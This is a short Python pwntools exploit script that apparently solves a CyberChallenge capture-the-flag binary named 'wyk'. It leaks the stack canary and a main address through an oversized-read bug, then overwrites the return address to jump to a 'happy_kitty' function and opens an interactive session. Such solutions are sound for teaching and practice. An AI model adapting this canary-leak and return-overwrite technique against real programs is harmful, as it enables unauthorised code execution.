#!/usr/bin/env python3
from pwn import *

bin_name = "./wyk"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b chall\ncontinue\n')
    elif args.REMOTE:
        return remote("kitty.challs.cyberchallenge.it", 38208)
    else:
        return process(elf.path)

def main():
    r = conn()
    r.sendlineafter(b'name? ',b'-100')
    r.sendlineafter(b'name? ',b'a'*24)
    r.recvline()
    canary = r.recv(7)
    canary = canary.rjust(8,b'\x00')
    canary = u64(canary)
    print(f"canay: {hex(canary)}")
    r.recv()
    r.sendline(b'-100')
    r.sendlineafter(b'name? ',b'a'*39)
    print(r.recvline())
    leaked_main = r.recv(6)
    leaked_main = leaked_main.ljust(8,b'\x00')

    leaked_main = u64(leaked_main)
    leaked_main = leaked_main-34
    print(f"main: {hex(leaked_main)}")

    elf.address = leaked_main - elf.sym['main']
    r.recv()
    r.sendline(b'-100')
    payload = b'a'*24+p64(canary)+b'a'*8+p64(elf.sym['happy_kitty'])
    r.sendlineafter(b'name? ',payload)
    r.recv()
    r.sendline(b'100')
    r.interactive()

if __name__ == "__main__":
    main()
100